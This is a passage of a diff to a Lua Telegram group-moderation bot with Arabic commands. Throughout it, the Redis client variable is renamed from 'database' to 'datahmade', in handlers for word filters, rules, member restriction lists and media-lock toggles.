+local taha = datahmade:get('MohaMeD:'..bot_id.."filtr1:add:reply:rd"..v..msg.chat_id_)   
 t = t..''..k..'- '..v..' » {'..taha..'}\n'    
 end  
 if #list == 0 then  
@@ -6562,43 +6424,43 @@ send(msg.chat_id_, msg.id_, 1, t, 1, 'html')
 end  
 if text and text == 'منع' and msg.reply_to_message_id_ == 0 and is_mod(msg) then      
 send(msg.chat_id_, msg.id_, 1, '📥┇ ارسل الكلمه المراد حذفها الان \n', 1, 'md')  
-database:set('MohaMeD:'..bot_id.."filtr1:add:reply1"..msg.sender_user_id_..msg.chat_id_,"rep")  
+datahmade:set('MohaMeD:'..bot_id.."filtr1:add:reply1"..msg.sender_user_id_..msg.chat_id_,"rep")  
 return false  
 end    
 if text then   
-local tsssst = database:get('MohaMeD:'..bot_id.."filtr1:add:reply1"..msg.sender_user_id_..msg.chat_id_)  
+local tsssst = datahmade:get('MohaMeD:'..bot_id.."filtr1:add:reply1"..msg.sender_user_id_..msg.chat_id_)  
 if tsssst == 'rep' then   
 send(msg.chat_id_, msg.id_, 1, "📥┇ ارسل تحذير عند ارسال الكلمه \n", 1, 'md')  
-database:set('MohaMeD:'..bot_id.."filtr1:add:reply1"..msg.sender_user_id_..msg.chat_id_,"repp")  
-database:set('MohaMeD:'..bot_id.."filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
-database:sadd('MohaMeD:'..bot_id.."repmedia"..msg.chat_id_,text)  
+datahmade:set('MohaMeD:'..bot_id.."filtr1:add:reply1"..msg.sender_user_id_..msg.chat_id_,"repp")  
+datahmade:set('MohaMeD:'..bot_id.."filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
+datahmade:sadd('MohaMeD:'..bot_id.."repmedia"..msg.chat_id_,text)  
 return false  end  
 end
 if text then  
-local test = database:get('MohaMeD:'..bot_id.."filtr1:add:reply1"..msg.sender_user_id_..msg.chat_id_)  
+local test = datahmade:get('MohaMeD:'..bot_id.."filtr1:add:reply1"..msg.sender_user_id_..msg.chat_id_)  
 if test == 'repp' then  
 send(msg.chat_id_, msg.id_, 1, '🔖┇تم منع الكلمه لن يتم ارسالها بعد الان  \n', 1, 'md')  
-database:del('MohaMeD:'..bot_id.."filtr1:add:reply1"..msg.sender_user_id_..msg.chat_id_)  
-local test = database:get('MohaMeD:'..bot_id.."filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
+datahmade:del('MohaMeD:'..bot_id.."filtr1:add:reply1"..msg.sender_user_id_..msg.chat_id_)  
+local test = datahmade:get('MohaMeD:'..bot_id.."filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
 if text then   
-database:set('MohaMeD:'..bot_id.."filtr1:add:reply:rd"..test..msg.chat_id_, text)  
-database:hset('MohaMeD:'..bot_id..'filters:'..msg.chat_id_, text, 'filtered')
+datahmade:set('MohaMeD:'..bot_id.."filtr1:add:reply:rd"..test..msg.chat_id_, text)  
+datahmade:hset('MohaMeD:'..bot_id..'filters:'..msg.chat_id_, text, 'filtered')
 end  
-database:del('MohaMeD:'..bot_id.."filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
+datahmade:del('MohaMeD:'..bot_id.."filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
 return false  end  
 end
 
 if text == 'الغاء منع' and msg.reply_to_message_id_ == 0 and is_mod(msg) then   
 send(msg.chat_id_, msg.id_, 1, '📥┇ ارسل الكلمه المراد حذفها من قائمه المنع \n', 1, 'md')  
-database:set('MohaMeD:'..bot_id.."filtr1:add:reply1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
+datahmade:set('MohaMeD:'..bot_id.."filtr1:add:reply1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
 return false  end
 if text then 
-local test = database:get('MohaMeD:'..bot_id.."filtr1:add:reply1"..msg.sender_user_id_..msg.chat_id_)  
+local test = datahmade:get('MohaMeD:'..bot_id.."filtr1:add:reply1"..msg.sender_user_id_..msg.chat_id_)  
 if test and test == 'reppp' then   
 send(msg.chat_id_, msg.id_, 1, "📮┇ تم الغاء منعها من قائمه المنع \n", 1, 'md')  
-database:del('MohaMeD:'..bot_id.."filtr1:add:reply1"..msg.sender_user_id_..msg.chat_id_)  
-database:del('MohaMeD:'..bot_id.."filtr1:add:reply:rd"..text..msg.chat_id_)  
-database:srem('MohaMeD:'..bot_id.."repmedia"..msg.chat_id_,text)  
+datahmade:del('MohaMeD:'..bot_id.."filtr1:add:reply1"..msg.sender_user_id_..msg.chat_id_)  
+datahmade:del('MohaMeD:'..bot_id.."filtr1:add:reply:rd"..text..msg.chat_id_)  
+datahmade:srem('MohaMeD:'..bot_id.."repmedia"..msg.chat_id_,text)  
 return false  end  
 end
 
@@ -6609,11 +6471,11 @@ send(msg.chat_id_, msg.id_, 1, txt[2], 1, 'html')
 end  
 if text and text:match("^وضع قوانين (.*)$") then
 local txt = {string.match(text, "^(وضع قوانين) (.*)$")}
-database:set('MohaMeD:'..bot_id..'rules'..msg.chat_id_, txt[2])
+datahmade:set('MohaMeD:'..bot_id..'rules'..msg.chat_id_, txt[2])
 send(msg.chat_id_, msg.id_, 1, "✔┇تم وضع القوانين للمجموعه", 1, 'md')
 end
 if text == ("الوقت") then
-local ex = database:ttl( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_)
+local ex = datahmade:ttl( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_)
 if ex == -1 then
 send(msg.chat_id_, msg.id_, 1, '🔘┇وقت المجموعه لا نهائي` ☑', 1, 'md')
 else
@@ -6649,7 +6511,7 @@ changetitle(msg.chat_id_, txt[2])
 send(msg.chat_id_, msg.id_, 1, '✔┇تم تحديث اسم المجموعه الى \n'..txt[2], 1, 'md')
 end
 if text == ("وضع صوره")  then
-database:set('MohaMeD:'..bot_id..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
+datahmade:set('MohaMeD:'..bot_id..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
 send(msg.chat_id_, msg.id_, 1, '♻️┇ قم بارسال صوره الان  ', 1, 'md')
 end
 if text == ("مسح الصوره") then
@@ -6664,10 +6526,10 @@ end
 
 if text == ("المقيدين") then
 local hash = 'MohaMeD:'..bot_id..'res:'..msg.chat_id_
-local list = database:smembers(hash)
+local list = datahmade:smembers(hash)
 text = "👥┇قائمة المقيدين ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
 for k,v in pairs(list) do
-local user_info = database:hgetall('MohaMeD'..bot_id.."user:"..v)
+local user_info = datahmade:hgetall('MohaMeD'..bot_id.."user:"..v)
 if user_info and user_info.username then
 local username = user_info.username
 text = text.."*|"..k.."|*~⪼(@"..username..")\n"
@@ -6688,8 +6550,8 @@ end
 ------------------------------------------------------------------------
 if text == ("مسح المقيدين") then
 local hash = 'MohaMeD:'..bot_id..'res:'..msg.chat_id_
-local list = database:smembers(hash) 
-for k,v in pairs(list) do database:del('MohaMeD:'..bot_id..'res:'..msg.chat_id_) 
+local list = datahmade:smembers(hash) 
+for k,v in pairs(list) do datahmade:del('MohaMeD:'..bot_id..'res:'..msg.chat_id_) 
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. v .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
 end
 send(msg.chat_id_, msg.id_, 1, '☑️┇تم مسح قائمه المقيدين', 1, 'md')
@@ -6702,11 +6564,11 @@ local hash ='MohaMeD:'..bot_id..'res:'..msg.chat_id_
 if ck_mod(result.sender_user_id_, msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع تقييد ( '..Rutba(result.sender_user_id_, msg.chat_id_)..' )', 1, 'md')
 else
-if database:sismember(hash, result.sender_user_id_) then
+if datahmade:sismember(hash, result.sender_user_id_) then
 tsX000("prore",msg,'☑️┇بالفعل تم تقييده')
 else
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.sender_user_id_ .. "")
-database:sadd(hash, result.sender_user_id_)
+datahmade:sadd(hash, result.sender_user_id_)
 tsX000("prore",msg,'☑️┇تم تقييده')
 end
 end
@@ -6727,7 +6589,7 @@ if ck_mod(result.id_, msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع تقييد ( '..Rutba(result.id_, msg.chat_id_)..' )', 1, 'md')
 else
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.id_ .. "")
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, result.id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, result.id_)
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(res[2] or 'MohaMeDteam')..')\n☑️┇تم تقييده'
 end
 else
@@ -6745,7 +6607,7 @@ if ck_mod(apba[2], msg.chat_id_) then
 send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع حظر او طرد ( '..Rutba(apba[2], msg.chat_id_)..' )', 1, 'md')
 else
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. apba[2] .. "")
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, apba[2])
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, apba[2])
 tsX000(apba[2],msg,"☑️┇تم تقييده")
 end
 return false
@@ -6754,11 +6616,11 @@ end
 if text == ("الغاء تقيد") and msg.reply_to_message_id_ then
 function res_by_reply(extra, result, success)
 local hash ='MohaMeD:'..bot_id..'res:'..msg.chat_id_
-if not database:sismember(hash, result.sender_user_id_) then
+if not datahmade:sismember(hash, result.sender_user_id_) then
 tsX000("prore",msg,"☑️┇ بالفعل تم الغاء تقييده")
 else
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
-database:srem(hash, result.sender_user_id_)
+datahmade:srem(hash, result.sender_user_id_)
 tsX000("prore",msg,"☑️┇ تم الغاء تقييده")
 end
 end
@@ -6772,7 +6634,7 @@ local res = {string.match(text, "^(الغاء تقيد) @(.*)$")}
 function res_by_username(extra, result, success)
 if result.id_ then
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
-database:srem(hash, result.id_)
+datahmade:srem(hash, result.id_)
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(res[2] or 'MohaMeDteam')..')\n☑️┇تم الغاء تقييده'
 else
 texts = '✖️┇خطاء'
@@ -6787,504 +6649,504 @@ if text and text:match("^الغاء تقيد (%d+)$") then
 local hash ='MohaMeD:'..bot_id..'res:'..msg.chat_id_
 local res = {string.match(text, "^(الغاء تقيد) (%d+)$")}
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. res[2] .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
-database:srem(hash, res[2])
+datahmade:srem(hash, res[2])
 tsX000(res[2],msg,"☑️┇ تم الغاء تقييده")
 return false
 end
 ------------------------------------------------------------------------
 if (text == "قفل التاك بالتقيد") then
-local tsX_o = database:get("lock_tag.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_tag.note:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم قفل التاك بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم قفل التاك بالتقييد")
-database:set("lock_tag.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_tag.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "قفل الشارحه بالتقيد") then
-local tsX_o = database:get("lock_sarha.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_sarha.note:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم قفل الشارحه بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم قفل الشارحه بالتقييد")
-database:set("lock_sarha.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_sarha.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "قفل المتحركه بالتقيد") then
-local tsX_o = database:get("lock_gif.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_gif.note:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم قفل المتحركه بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم قفل المتحركه بالتقييد")
-database:set("lock_gif.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_gif.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "قفل الملفات بالتقيد") then
-local tsX_o = database:get("lock_files.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_files.note:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم قفل الملفات بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم قفل الملفات بالتقييد")
-database:set("lock_files.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_files.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "قفل الماركدون بالتقيد") then
-local tsX_o = database:get("lock_mark.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_mark.note:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم قفل الماكدون بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم قفل الماركدون بالتقييد")
-database:set("lock_mark.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_mark.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "قفل الصور بالتقيد") then
-local tsX_o = database:get("lock_photo.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_photo.note:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم قفل الصور بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم قفل الصور بالتقييد")
-database:set("lock_photo.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_photo.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "قفل الملصقات بالتقيد") then
-local tsX_o = database:get("lock_stecker.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_stecker.note:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم قفل الملصقات بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم قفل الملصقات بالتقييد")
-database:set("lock_stecker.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_stecker.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "قفل الفيديو بالتقيد") then
-local tsX_o = database:get("lock_video.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_video.note:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم قفل الفيديو بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم قفل الفيديو بالتقييد")
-database:set("lock_video.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_video.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "قفل الانلاين بالتقيد") then
-local tsX_o = database:get("lock_inline.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_inline.note:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم قفل الانلاين بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم قفل الانلاين بالتقييد")
-database:set("lock_inline.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_inline.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "قفل الدردشه بالتقيد") then
-local tsX_o = database:get("lock_chat.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_chat.note:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم قفل الدردشه بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم قفل الدردشه بالتقييد")
-database:set("lock_chat.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_chat.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "قفل التوجيه بالتقيد") then
-local tsX_o = database:get("lock_fwd.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_fwd.note:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم قفل التوجيه بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم قفل التوجيه بالتقييد")
-database:set("lock_fwd.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_fwd.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "قفل الاغاني بالتقيد") then
-local tsX_o = database:get("lock_audeo.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_audeo.note:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم قفل الاغاني بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم قفل الاغاني بالتقييد")
-database:set("lock_audeo.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_audeo.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "قفل الصوت بالتقيد") then
-local tsX_o = database:get("lock_voice.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_voice.note:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم قفل الصوت بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم قفل الصوت بالتقييد")
-database:set("lock_voice.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_voice.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "قفل الجهات بالتقيد") then
-local tsX_o = database:get("lock_contact.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_contact.note:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم قفل الجهات بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم قفل الجهات بالتقييد")
-database:set("lock_contact.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_contact.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "قفل العربيه بالتقيد") then
-local tsX_o = database:get("lock_ar.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_ar.note:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم قفل العربيه بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم قفل العربيه بالتقييد")
-database:set("lock_ar.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_ar.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "قفل الانكليزيه بالتقيد") then
-local tsX_o = database:get("lock_en.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_en.note:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم قفل الانكليزيه بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم قفل الانكليزيه بالتقييد")
-database:set("lock_en.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_en.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "قفل الروابط بالتقيد") then
-local tsX_o = database:get("lock_link.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_link.note:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم قفل الروابط بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم قفل الروابط بالتقييد")
-database:set("lock_link.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_link.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "قفل المعرف بالتقيد") then
-local tsX_o = database:get("lock_username.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_username.note:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
  tsX000("lock",msg,"☑️┇بالفعل تم قفل المعرف بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم قفل المعرف بالتقييد")
-database:set("lock_username.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_username.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "قفل بصمه الفيديو بالتقيد") then
-local tsX_o = database:get("lock_note.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_note.note:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم قفل بصمه الفيديو بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم قفل بصمه الفيديو بالتقييد")
-database:set("lock_note.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_note.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "فتح التاك بالتقيد") then
-local tsX_o = database:get("lock_tag.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_tag.note:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم فتح التاك بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم فتح التاك بالتقييد")
-database:del("lock_tag.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_tag.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "فتح الشارحه بالتقيد") then
-local tsX_o = database:get("lock_sarha.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_sarha.note:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم فتح الشارحه بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم فتح الشارحه بالتقييد")
-database:del("lock_sarha.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_sarha.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "فتح المتحركه بالتقيد") then
-local tsX_o = database:get("lock_gif.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_gif.note:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
  tsX000("lock",msg,"☑️┇بالفعل تم فتح المتحركه بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم فتح المتحركه بالتقييد")
-database:del("lock_gif.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_gif.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "فتح الملفات بالتقيد") then
-local tsX_o = database:get("lock_files.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_files.note:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم فتح الملفات بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم فتح الملفات بالتقييد")
-database:del("lock_files.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_files.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "فتح الماركدون بالتقيد") then
-local tsX_o = database:get("lock_mark.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_mark.note:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم فتح الماركدون بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم فتح الماركدون بالتقييد")
-database:del("lock_mark.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_mark.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "فتح الصور بالتقيد") then
-local tsX_o = database:get("lock_photo.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_photo.note:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم فتح الصور بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم فتح الصور بالتقييد")
-database:del("lock_photo.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_photo.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "فتح الملصقات بالتقيد") then
-local tsX_o = database:get("lock_stecker.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_stecker.note:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم فتح الملصقات بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم فتح الملصقات بالتقييد")
-database:del("lock_stecker.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_stecker.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "فتح الفيديو بالتقيد") then
-local tsX_o = database:get("lock_video.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_video.note:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم فتح الفيديو بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم فتح الفيديو بالتقييد")
-database:del("lock_video.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_video.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "فتح الانلاين بالتقيد") then
-local tsX_o = database:get("lock_inline.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_inline.note:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم فتح الانلاين بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم فتح الانلاين بالتقييد")
-database:del("lock_inline.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_inline.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "فتح الدردشه بالتقيد") then
-local tsX_o = database:get("lock_chat.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_chat.note:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم فتح الدردشه بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم فتح الدردشه بالتقييد")
-database:del("lock_chat.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_chat.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "فتح التوجيه بالتقيد") then
-local tsX_o = database:get("lock_fwd.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_fwd.note:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم فتح التوجيه بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم فتح التوجيه بالتقييد")
-database:del("lock_fwd.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
